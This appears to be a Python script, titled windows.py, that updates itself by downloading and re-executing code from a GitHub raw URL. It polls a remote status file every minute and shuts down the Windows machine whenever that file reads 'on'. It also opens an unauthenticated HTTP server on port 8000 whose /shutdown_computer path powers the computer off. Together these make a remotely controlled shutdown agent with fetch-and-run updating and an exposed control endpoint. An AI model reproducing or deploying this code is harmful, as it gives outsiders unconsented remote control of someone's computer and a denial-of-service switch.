import os
import requests
import http.server
import socketserver
import subprocess
import time
import threading

# URLs of the remote files
version_url = 'https://raw.githubusercontent.com/rexzy69/Seawee/main/version.txt'
script_url = 'https://raw.githubusercontent.com/rexzy69/Seawee/main/windows.py'
status_url = 'https://raw.githubusercontent.com/rexzy69/Seawee/main/on-off.txt'

# Local paths
local_version_file = 'version.txt'
local_script_file = 'windows.py'

def get_remote_version():
    try:
        response = requests.get(version_url)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f"Error fetching remote version: {e}")
        return None

def get_local_version():
    if os.path.exists(local_version_file):
        with open(local_version_file, 'r') as file:
            return file.read().strip()
    return None

def download_new_script():
    try:
        response = requests.get(script_url)
        response.raise_for_status()
        with open(local_script_file, 'wb') as file:
            file.write(response.content)
        print("Updated script downloaded successfully.")
    except requests.RequestException as e:
        print(f"Error downloading new script: {e}")

def update_version_file(new_version):
    with open(local_version_file, 'w') as file:
        file.write(new_version)
    print("Version file updated successfully.")

def check_for_updates():
    local_version = get_local_version()
    remote_version = get_remote_version()

    if remote_version and local_version != remote_version:
        print(f"Updating script from version {local_version} to {remote_version}...")
        download_new_script()
        update_version_file(remote_version)
        print("Update complete. Restarting the script...")
        os.execv(local_script_file, [local_script_file])
    else:
        print("No update needed. The script is up-to-date.")

def check_shutdown_status():
    while True:
        try:
            response = requests.get(status_url)
            response.raise_for_status()
            status = response.text.strip()
            if status == 'on':
                print("Shutdown status is 'on'. Shutting down the computer...")
                subprocess.call(['shutdown', '/s', '/t', '0'])
            else:
                print("Shutdown status is 'off'. No action taken.")
        except requests.RequestException as e:
            print(f"Error checking shutdown status: {e}")
        
        time.sleep(60)  # Check the status every 1 minute

class ShutdownRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/shutdown_computer':
            self.send_response(200)
            self.end_headers()
            subprocess.call(['shutdown', '/s', '/t', '0'])

def run_server():
    PORT = 8000  # Choose any port that is not being used
    with socketserver.TCPServer(("", PORT), ShutdownRequestHandler) as httpd:
        print(f"Listening for shutdown requests on port {PORT}...")
        httpd.serve_forever()

if __name__ == '__main__':
    check_for_updates()
    status_thread = threading.Thread(target=check_shutdown_status)
    status_thread.daemon = True
    status_thread.start()
    run_server()
